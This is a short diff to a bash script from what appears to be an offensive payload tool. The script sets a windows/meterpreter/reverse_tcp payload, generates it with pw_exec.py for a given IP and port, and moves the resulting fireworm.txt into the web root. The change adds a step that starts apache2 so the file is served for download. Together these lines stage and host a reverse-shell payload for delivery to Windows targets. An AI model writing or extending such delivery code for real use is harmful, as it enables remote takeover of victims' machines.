@@ -15,11 +15,12 @@ payload=windows/meterpreter/reverse_tcp
 python pw_exec.py $payload $ip $port > /dev/null 2>&1
 rm unicorn.rc
 
-echo "You want move fireworm.txt to /var/www/html/ ( y or n) :"
+echo "You want move fireworm.txt to /var/www/html/ and also want to start apache2 ( y or n) :"
 read start1;
 
 if [ $start1 = "y" ]; then
  mv fireworm.txt /var/www/html/
+ service apache2 start
 else
  echo "Enter the file name :"
  read filename;
